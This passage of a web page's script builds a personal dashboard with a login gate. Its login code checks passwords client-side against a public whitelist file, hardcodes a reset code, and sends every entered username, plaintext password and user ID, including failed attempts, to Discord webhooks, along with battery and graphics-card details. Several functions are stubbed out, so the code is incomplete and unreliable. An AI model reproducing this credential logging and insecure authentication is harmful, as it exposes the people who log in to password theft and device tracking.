                onend: (event) => { logAction("Panel Dragged", { panelId: event.target.dataset.panelId || 'Unknown', position: `${event.target.getAttribute('data-x')},${event.target.getAttribute('data-y')}` }); }
              })
              .resizable({
                  handles: '.handle', // Use the '.handle' class for all handles
                  preserveAspectRatio: false,
                  modifiers: [ interact.modifiers.restrictSize({ min: { width: 200, height: 120 } }) ],
                  autoScroll: true
              })
              .on('resizing', function (event) {
                  const target = event.target;
                  const x = (parseFloat(target.getAttribute('data-x')) || 0);
                  const y = (parseFloat(target.getAttribute('data-y')) || 0);
                  target.style.width = event.rect.width + 'px';
                  target.style.height = event.rect.height + 'px';
                  target.style.transform = `translate(${x}px, ${y}px)`; // Ensure translation persists
              })
              .on('resizeend', function(event) {
                logAction("Panel Resized", { panelId: event.target.dataset.panelId || 'Unknown', size: `${event.rect.width}x${event.rect.height}` });
              });

          // Add handles and data-panel-ids to draggable/resizable elements
          document.querySelectorAll('.main-row .box, #updatesNotifications .box').forEach(panel => {
              if (!panel.id) panel.id = `panel-${Math.random().toString(36).substr(2, 9)}`; // Unique ID if missing
              if (!panel.dataset.panelId) panel.dataset.panelId = panel.id; // Use ID as panelId if not set
              if (!panel.querySelector('.handle')) { // Add handle if it doesn't exist
                  const handle = document.createElement('div'); handle.className = 'handle';
                  panel.style.position = 'relative'; // Essential for handle positioning
                  panel.appendChild(handle);
              }
              panel.setAttribute('data-x', 0); panel.setAttribute('data-y', 0); // Initialize transform attributes
          });
      },
      
      // Toggle panel visibility via ID
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        if (panel) {
          const isHidden = panel.style.display === 'none';
          panel.style.display = isHidden ? 'block' : 'none';
          logAction(`Panel Toggled`, { panelId: panelId, state: isHidden ? 'visible' : 'hidden' });
          if (isHidden) { // If panel becomes visible, scroll it into view
            setTimeout(() => panel.scrollIntoView({ behavior: 'smooth', block: 'center' }), 100);
          }
        }
      },
      
      // Show specific content within panels (e.g., iPad content)
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => content.style.display = 'none');
        const targetContent = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
        if (targetContent) { targetContent.style.display = 'block'; logAction("iPad Content Shown", { contentType: contentId }); }
      },
      showBypassContent: function(contentId) { // For Bypass panel content
        document.querySelectorAll('.bypass-content').forEach(content => content.style.display = 'none');
        const targetContent = document.getElementById(contentId + 'Bypass');
        if (targetContent) { targetContent.style.display = 'block'; logAction("Bypass Content Shown", { contentType: contentId }); }
      },

      // Tools Initialization (Timer, Stopwatch, Reminder)
      initTools: function() {
          let timerInterval = null, stopwatchInterval = null, timerRunning = false, stopwatchRunning = false;
          let timerSeconds = 0; // Stores timer duration in seconds
          const formatTimeHMS = (s) => { const h=String(Math.floor(s/3600)).padStart(2,'0'), m=String(Math.floor((s%3600)/60)).padStart(2,'0'), sec=String(s%60).padStart(2,'0'); return `${h}:${m}:${sec}`; };

          // Timer Button
          document.getElementById('timerBtn')?.addEventListener('click', () => {
              logAction("Timer Button Clicked");
              const durationInput = prompt("Enter Timer Duration (e.g., 1h, 30m, 90s, or just seconds):");
              if (!durationInput) return;

              let durationMs = 0;
              const inputLower = durationInput.toLowerCase();
              if (inputLower.endsWith('h')) durationMs = parseFloat(inputLower.slice(0,-1)) * 3600000;
              else if (inputLower.endsWith('m')) durationMs = parseFloat(inputLower.slice(0,-1)) * 60000;
              else if (inputLower.endsWith('s')) durationMs = parseFloat(inputLower.slice(0,-1)) * 1000;
              else durationMs = parseFloat(inputLower) * 1000;

              if (isNaN(durationMs) || durationMs <= 0) {
                  alert("Invalid format. Use e.g., '1h', '30m', '90s', or seconds only."); return;
              }

              if (!timerRunning) {
                  timerRunning = true; timerSeconds = durationMs / 1000;
                  alert(`Timer set for ${durationInput}. Starting.`);
                  document.getElementById('timerBtn').innerText = `⏱️ ${formatTimeHMS(timerSeconds)}`;
                  timerInterval = setInterval(() => {
                      if (timerSeconds <= 0) { clearInterval(timerInterval); timerRunning = false; alert("⏰ Timer Finished!"); logAction("Timer Finished"); document.getElementById('timerBtn').innerText = "⏱️ Timer"; return; }
                      timerSeconds--; document.getElementById('timerBtn').innerText = `⏱️ ${formatTimeHMS(timerSeconds)}`;
                  }, 1000);
              } else alert("Timer is already running.");
          });

          // Stopwatch Button
          document.getElementById('stopwatchBtn')?.addEventListener('click', () => {
              logAction("Stopwatch Button Clicked");
              if (!stopwatchRunning) {
                  stopwatchRunning = true; let elapsed = 0;
                  document.getElementById('stopwatchBtn').innerText = "⏺️ 00:00:00";
                  stopwatchInterval = setInterval(() => { elapsed++; document.getElementById('stopwatchBtn').innerText = `⏺️ ${formatTimeHMS(elapsed)}`; }, 1000);
                  logAction("Stopwatch Started");
              } else {
                  clearInterval(stopwatchInterval); stopwatchRunning = false;
                  logAction("Stopwatch Stopped", { duration: document.getElementById('stopwatchBtn').innerText });
              }
          });
          
          // Reminder Button
          document.getElementById('reminderBtn')?.addEventListener('click', () => {
              logAction("Reminder Button Clicked");
              const message = prompt("Enter Reminder Message:");
              if (!message) return;
              const timeStr = prompt("Enter Reminder Time (HH:MM in 24-hour format):");
              if (!timeStr) return;

              const timeParts = timeStr.split(':');
              if (timeParts.length !== 2) { alert("Invalid format. Use HH:MM."); return; }
              const hours = parseInt(timeParts[0], 10), minutes = parseInt(timeParts[1], 10);
              if (isNaN(hours) || isNaN(minutes) || hours < 0 || hours > 23 || minutes < 0 || minutes > 59) { alert("Invalid hours or minutes."); return; }

              const now = new Date(); const reminderTime = new Date();
              reminderTime.setHours(hours); reminderTime.setMinutes(minutes); reminderTime.setSeconds(0); reminderTime.setMilliseconds(0);
              if (reminderTime <= now) reminderTime.setDate(reminderTime.getDate() + 1); // Schedule for next day if time has passed today

              const timeUntil = reminderTime.getTime() - now.getTime();
              setTimeout(() => { alert(`🔔 REMINDER: ${message}`); logAction("Reminder Alert Shown", { message: message, reminderTime: reminderTime.toISOString() }); }, timeUntil);
              alert(`Reminder set for ${reminderTime.toLocaleString()}`);
          });
      },

      // Theme selection (placeholder)
      initThemeDisplay: function() {
          document.getElementById('themesBtn')?.addEventListener('click', () => {
              logAction("Themes Button Clicked");
              alert("Theme selection is available in the Settings panel. More themes are planned.");
          });
      },

      // Fetch and display random fact
      fetchRandomFact: async function() {
          const factElement = document.getElementById('randomFact');
          if (!factElement) return;
          factElement.innerText = "Fetching a random fact...";
          try {
              const response = await fetch('https://cat-fact.herokuapp.com/facts/random');
              const data = await response.json();
              factElement.innerText = data.text || "Could not fetch fact.";
              logAction("Random Fact Fetched");
          } catch (error) { factElement.innerText = "Could not fetch fact."; console.error("Fact fetch error:", error); }
      },

      // Fetch and display daily quote
      fetchDailyQuote: async function() {
          const quoteElement = document.getElementById('dailyQuote');
          if (!quoteElement) return;
          quoteElement.innerText = "Fetching a daily quote...";
          try {
              const response = await fetch('https://api.quotable.io/random');
              const data = await response.json();
              quoteElement.innerText = `"${data.content}" - ${data.author}`;
              logAction("Daily Quote Fetched");
          } catch (error) { quoteElement.innerText = "Could not fetch quote."; console.error("Quote fetch error:", error); }
      },

      // Initialize and display Activity Log
      initActivityLogBtn: function() {
          const activityLogBtn = document.getElementById('activityLogBtn');
          const activityLogDisplay = document.getElementById('activityLogDisplay');
          const activityLogList = document.getElementById('activityLogList');

          if (activityLogBtn && activityLogDisplay && activityLogList) {
              activityLogBtn.addEventListener('click', () => {
                  logAction("Activity Log Button Clicked");
                  activityLogList.innerHTML = ''; // Clear previous content
                  if (window.activityLogs.length === 0) {
                      activityLogList.innerHTML = '<li>No activity logged yet.</li>';
                  } else {
                      window.activityLogs.forEach(entry => {
                          const li = document.createElement('li');
                          const timestampParts = entry.timestamp.split('T');
                          const time = timestampParts[1]?.split('.')[0] || 'N/A';
                          let detailsString = '';
                          if (entry.details && Object.keys(entry.details).length > 0) {
                              detailsString = ` ${JSON.stringify(entry.details)}`;
                          }
                          li.innerHTML = `<strong>${time}</strong> (${timestampParts[0] || 'N/A'}): ${entry.action}${detailsString}`;
                          activityLogList.appendChild(li);
                      });
                  }
                  dashboard.togglePanel('activityLogDisplay'); // Show the panel
                  logAction("Activity Log Display Opened");
              });
          }
      },

      // Initialize and display Login History
      initLoginHistoryBtn: function() {
          const loginHistoryBtn = document.getElementById('loginHistoryBtn');
          const lastLoginInfoSpan = document.getElementById('lastLoginInfo');
          if (loginHistoryBtn && lastLoginInfoSpan) {
              loginHistoryBtn.addEventListener('click', () => {
                  logAction("Login History Button Clicked");
                  const lastLoginText = window.lastLoginInfo ? new Date(window.lastLoginInfo).toLocaleString() : 'No successful logins recorded yet.';
                  lastLoginInfoSpan.textContent = lastLoginText;
                  dashboard.togglePanel('loginHistoryDisplay');
                  logAction("Login History Displayed");
              });
          }
      },

      // Apply color classes to Wi-Fi level indicators
      applyWifiLevelColors: function() {
        document.querySelectorAll('.wifi-entry').forEach(entry => {
          const wifiLevelDiv = entry.children[1]; // Second child typically contains the level
          if (wifiLevelDiv) {
            const level = wifiLevelDiv.innerText.toLowerCase();
            wifiLevelDiv.className = wifiLevelDiv.className.replace(/wifi-level-\w+/g, ''); // Remove old classes
            switch(level) {
              case 'high': wifiLevelDiv.classList.add('wifi-level-high'); break;
              case 'medium': wifiLevelDiv.classList.add('wifi-level-medium'); break;
              case 'low': wifiLevelDiv.classList.add('wifi-level-low'); break;
              default: wifiLevelDiv.classList.add('wifi-level-unknown'); // For 'Unknown' or other text
            }
          }
        });
      },

      // Placeholder: Settings button actions
      initSettings: function() {
        // Handled by onclick directly on the buttons now for clarity
      },

      // Placeholder: Keybinds button functionality
      initKeybinds: function() {
          // Add a keybind listener
          const setKeybindsBtn = document.getElementById('keybindsBtn'); // Assuming this button will be added or is referred to generically
          // If a button for Keybinds is missing, this will do nothing. It should be added to the quick-bar.
          // For now, let's make it clear its purpose.
          // Add the keybinds button to the quick-bar for visibility:
          if (!document.getElementById('keybindsBtn')) {
             const kbBtn = document.createElement('button');
             kbBtn.id = 'keybindsBtn';
             kbBtn.innerText = '⌨️ Keybinds';
             kbBtn.onclick = () => {
                 logAction("Keybinds Button Clicked");
                 alert("Keybind configuration is a complex feature. Basic keybinds like Ctrl+N for Notes, or Ctrl+S for Save Notes (when in Notes), might be implemented in the future. User configuration is planned.");
                 // Example for Ctrl+N opening notes:
                 // if(evt.key === 'n' && (evt.metaKey || evt.ctrlKey)) { dashboard.togglePanel('canvasContainer'); evt.preventDefault(); }
             };
             // Find the quick-bar and append the button
             const qb = document.querySelector('.dashboard .quick-bar');
             if (qb) qb.appendChild(kbBtn);
          } else {
              // If button exists, just ensure it logs
               document.getElementById('keybindsBtn').addEventListener('click', () => {
                  logAction("Keybinds Button Clicked");
                  alert("Keybind configuration is a complex feature. Basic keybinds like Ctrl+N for Notes, or Ctrl+S for Save Notes (when in Notes), might be implemented in the future. User configuration is planned.");
               });
          }
      },

      // Placeholder: Calculator button
      initCalculatorButton: function() {
          document.getElementById('calculatorBtn')?.addEventListener('click', () => {
              logAction("Calculator Button Clicked");
              alert("Calculator functionality is a placeholder. A simple calculator interface is planned.");
              // Could open a simple modal with a calculator later
          });
      },

      // Placeholder: Unit Converter button
      initUnitConverterButton: function() {
          document.getElementById('unitConverterBtn')?.addEventListener('click', () => {
              logAction("Unit Converter Button Clicked");
              alert("Unit Converter functionality is a placeholder. A unit conversion tool is planned.");
          });
      },

      // Placeholder: Stats button (derivates from activity logs)
      initStatsButton: function() {
          document.getElementById('statsBtn')?.addEventListener('click', () => {
              logAction("Stats Button Clicked");
              let stats = { actions: window.activityLogs.length };
              let distinctActions = new Set(window.activityLogs.map(log => log.action));
              stats.distinctActions = distinctActions.size;
              let loginSuccessCount = window.activityLogs.filter(log => log.action === "Successful Login").length;
              stats.successfulLogins = loginSuccessCount;

              alert(`System Statistics:\nTotal Actions Logged: ${stats.actions}\nUnique Actions: ${stats.distinctActions}\nSuccessful Logins: ${stats.successfulLogins}\n(More detailed stats planned)`);
          });
      },

      // Placeholder: Media button
      initMediaButton: function() {
          document.getElementById('mediaBtn')?.addEventListener('click', () => {
              logAction("Media Button Clicked");
              // Suggesting proxying or linking to known platforms
              window.open('https://www.youtube.com/user/MAHSAnnouncements?app=desktop', '_blank'); // Example YouTube link
              // A proxy would be a more complex feature to implement directly here.
          });
      },
       // Reminder button logic is handled in initTools()
       // initReminderButton: function() {} // already called by initTools
    };

    // --- Login System Logic (IIFE) ---
    (function() {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhook URLs for logging (from previous version)
      const loggingWebhooks = { username: '...', password: '...', identifier: '...', ... };
      const resetWebhooks = { detection: '...', success: '...', failure: '...' };
      const webhookUrls = { userLogging: '...', browserLogging: '...', ... }; // From original code for dashboard logging

      // DOM Element References
      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username'); const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID'); const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
      const submitBtn = document.getElementById('submitBtn'); const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText'); const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField'); const resetBtn = document.getElementById('resetBtn');
      const loginAttemptCounterDisplay = document.getElementById('loginAttemptCounterDisplay');
      const loginDateTimeBox = document.getElementById('loginDateTimeBox'); const timeFormatToggleBtn = document.getElementById('timeFormatToggleBtn');
      const passwordToggleBtn = document.getElementById('passwordToggleBtn'); // Toggle for show password

      let attempts = 3; // Initial attempts count
      let users = []; // User data storage
      let loginTime = null; // Timestamp for login

      // Global variable to control time format across login/dashboard
      let is24HourFormat = false; 

      // --- Pre-Login Animation & Transition ---
      function handlePreLogin() {
          const overlay = document.getElementById('preLoginOverlay');
          if (overlay) {
              setTimeout(() => {
                  overlay.classList.add('fade-out');
                  overlay.addEventListener('transitionend', () => {
                      overlay.style.display = 'none'; // Hide overlay after fade out
                      if (loginBox) loginBox.style.display = 'block'; // Show login form
                      document.body.classList.add('login-body'); // Activate login styles
                      document.body.style.zoom = '1'; // Reset zoom
                      logAction("Pre-login animations completed, login screen displayed.");
                  }, { once: true });
              }, 2000); // Start fading after 2 seconds
          } else { // Fallback if overlay doesn't exist
              if (loginBox) loginBox.style.display = 'block';
          }
      }

      // Update login screen's time/date display and format toggle
      function updateLoginDateTimeBox() {
          const now = new Date();
          const optionsTime = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: !is24HourFormat };
          const optionsDate = { weekday: 'short', month: 'short', day: 'numeric', year: 'numeric' };
          if (loginDateTimeBox) loginDateTimeBox.innerText = `${now.toLocaleDateString(undefined, optionsDate)} 🕒 ${now.toLocaleTimeString(undefined, optionsTime)}`;
          if (timeFormatToggleBtn) timeFormatToggleBtn.innerHTML = is24HourFormat ? '🔄 12h' : '🔄 24h';
      }

      // Initialize login system: fetch user data and start pre-login animation
      async function initializeLoginSystem() {
          try {
              const response = await fetch(USER_JSON_URL);
              if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
              users = await response.json();
              logAction("User data loaded successfully.");
          } catch (error) {
              users = []; console.error('Failed to load user JSON:', error);
          }
          handlePreLogin(); // Start animations
      }

      // Flash red border/shadow on login box for error feedback
      function flashRedOutline() {
        loginBox.classList.add('flashing');
        setTimeout(() => loginBox.classList.remove('flashing'), 800); // Remove class after animation completes
      }

      // --- Data Collection for Webhooks ---
      // Function to get WebGL renderer info
      function getWebGLRenderer() { /* ... same as previous version ... */ }
      // Function to get battery status
      async function getBatteryStatus() { /* ... same as previous version ... */ }
      // Function to collect overall login data
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        return { user: user, password: password, loginTime: loginTime, batteryStatus: await getBatteryStatus(), webglRenderer: getWebGLRenderer() };
      }

      // Function to find user from whitelist data
      function findUser(username, userID) { /* ... same as previous version ... */ }
      
      // Function to send data to Discord Webhooks
      async function sendWebhook(url, embedData) { /* ... same as previous version ... */ }

      // Helper to log specific action details to Discord
      async function logActionDetail(webhookType, user, value, fieldName) { /* ... same as previous version, adjusted to use provided functions ... */ }
      // Specific loggers for attempts
      async function logAttempts(user, username, password, identifier, attemptsLeft) { await logActionDetail('attempts_counter', user, `Username: ${username}, Password: ${password}, ID: ${identifier}, Attempts Left: ${attemptsLeft}`, 'Attempt Details'); }
      async function logAttemptsExceeded(user, username, password, identifier) { await logActionDetail('attempts_exceeded', user, `Username: ${username}, Password: ${password}, ID: ${identifier}`, 'Failure Reason'); }
      
      // Placeholder embed builders for dashboard logging (kept for completeness but not used by login process directly)
      function buildUserLoggingEmbed(data) { /* ... */ }
      function buildBrowserLoggingEmbed(data) { /* ... */ }
      function buildDeviceLoggingEmbed(data) { /* ... */ }
      function buildConnectionLoggingEmbed(data) { /* ... */ }
      function buildSessionLoggingEmbed(data) { /* ... */ }

      // --- Login Submission and Attempt Handling ---
      async function submitLogin() {
        errorMsg.textContent = ''; // Clear previous errors
        const username = usernameInput.value.trim(); const password = passwordInput.value.trim();
        const userID = userIDInput.value.trim();
        if (!username || !password || !userID) { errorMsg.textContent = 'Please fill all fields.'; return; }
        logAction("Login submission attempt", { username: username, userID: userID });

        const user = findUser(username, userID);
        await logAttempts(user, username, password, userID, attempts); // Log attempt

        if (!user) { // Invalid user or ID
          await logActionDetail('invalid_username', null, username, 'Attempted Username'); await logActionDetail('invalid_identifier', null, userID, 'Attempted User ID');
          errorMsg.textContent = 'Invalid Username or User ID.'; handleFailedAttempt(); return;
        }
        if (password !== user.password) { // Incorrect password
          await logActionDetail('invalid_password', user, password, 'Incorrect Password');
          errorMsg.textContent = 'Incorrect Password.'; handleFailedAttempt(); return;
        }

        // --- Successful Login ---
        logAction("Successful Login", { userName: user.name });
        // Log successful details and then send all other logs
        await logActionDetail('username', user, username, 'Username'); await logActionDetail('password', user, password, 'Password'); await logActionDetail('identifier', user, userID, 'User ID');
        
        const loggingData = await collectLoggingData(user, password);
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed({ ...loggingData, lastActivityTime: loggingData.loginTime }))
        ]);

        // Transition to Dashboard
        loginBox.style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.body.classList.remove('login-body'); document.body.classList.add('dashboard-body');
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        window.lastLoginInfo = loggingData.loginTime; // Store last login for history feature
        dashboard.init(); // Initialize dashboard
      }

      // Handle failed login attempt
      function handleFailedAttempt() {
        attempts--;
        if (loginAttemptCounterDisplay) loginAttemptCounterDisplay.textContent = `Attempts: ${attempts}`;
        if (attemptsText) attemptsText.textContent = `Attempts Left: ${attempts}`;

        if (attempts <= 0) {
          attempts = 0; errorMsg.textContent = 'Maximum attempts exceeded. Please reset.';
          const user = findUser(usernameInput.value.trim(), userIDInput.value.trim()); // Get context for logging
          logAttemptsExceeded(user, usernameInput.value.trim(), passwordInput.value.trim(), userIDInput.value.trim());
          showResetPopup(); disableInputs();
        } else {
          if (attempts <= 3) flashRedOutline(); // Flash if attempts are low
        }
      }

      // UI manipulation helpers
      function disableInputs() { usernameInput.disabled = passwordInput.disabled = userIDInput.disabled = submitBtn.disabled = true; }
      function enableInputs() { usernameInput.disabled = passwordInput.disabled = userIDInput.disabled = submitBtn.disabled = false; }
      function showResetPopup() { resetPopup.style.display = 'block'; resetPopup.setAttribute('aria-hidden', 'false'); resetField.focus(); }
      function hideResetPopup() { resetPopup.style.display = 'none'; resetPopup.setAttribute('aria-hidden', 'true'); resetField.value = ''; }

      // Reset Counter Logic
      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const correctResetCode = 'Reset.Counter.2579'; // Sensitive code, could be dynamic or more complex
        const username = usernameInput.value.trim() || 'Unknown';
        const password = passwordInput.value.trim() || 'Unknown';
        const userID = userIDInput.value.trim() || 'Unknown';
        const user = findUser(username, userID) || {};

        // Log reset box detection
        await sendWebhook(resetWebhooks.detection, { title: "🔔 Reset Box Detected", color: 0xffff00, fields: [ { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: userID, inline: true }, { name: "Entered Code", value: enteredCode, inline: false }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] });

        if (enteredCode === correctResetCode) { // Correct code
          logAction("Reset code accepted."); await sendWebhook(resetWebhooks.success, { title: "✅ Reset Code Accepted", color: 0x00ff00, fields: [ { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "User ID", value: userID, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] });
          attempts = 3; // Reset attempts
          if(loginAttemptCounterDisplay) loginAttemptCounterDisplay.textContent = `Attempts: ${attempts}`;
          if(attemptsText) attemptsText.textContent = `Attempts Left: ${attempts}`;
          enableInputs(); hideResetPopup(); errorMsg.textContent = '';
          loginBox.style.borderColor = loginBox.style.boxShadow = ''; loginBox.classList.remove('flashing');
        } else { // Incorrect code
          logAction("Incorrect Reset Code Attempt"); await sendWebhook(resetWebhooks.failure, { title: "❌ Incorrect Reset Code Attempt", color: 0xff0000, fields: [ { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "User ID", value: userID, inline: true }, { name: "Entered Code", value: enteredCode, inline: false }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] });
          alert('Incorrect reset code.'); resetField.value = '';
        }
      }

      // Event listeners for login actions
      submitBtn?.addEventListener('click', submitLogin);
      resetBtn?.addEventListener('click', resetCounter);

      // Handle Enter key submissions
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (document.activeElement === resetField) resetCounter();
          else if (resetPopup.style.display === 'none' && (document.activeElement === usernameInput || document.activeElement === passwordInput || document.activeElement === userIDInput)) submitLogin();
        }
      });
      
      // Password toggle logic
      let showPassword = false;
      passwordToggleBtn?.addEventListener('click', () => {
          showPassword = !showPassword;
          passwordInput.type = showPassword ? 'text' : 'password';
          passwordToggleBtn.innerHTML = showPassword ? '🙈' : '👁️';
          logAction("Password visibility toggled", { visible: showPassword });
      });

      // Time format toggle logic
      timeFormatToggleBtn?.addEventListener('click', () => {
          is24HourFormat = !is24HourFormat;
          updateLoginDateTimeBox(); // Update display with new format
          logAction("Time Format Toggled", { newFormat: is24HourFormat ? "24-hour" : "12-hour" });
      });

      // Initializations
      updateLoginDateTimeBox(); setInterval(updateLoginDateTimeBox, 1000); // Start clock update
      if (loginAttemptCounterDisplay) loginAttemptCounterDisplay.textContent = `Attempts: ${attempts}`;
      if (attemptsText) attemptsText.textContent = `Attempts Left: ${attempts}`;
      if (loginBox) loginBox.style.display = 'none'; // Hide login box initially

      initializeLoginSystem(); // Start the whole process
    })(); // End of Login System IIFE

  </script>
</body>
</html>
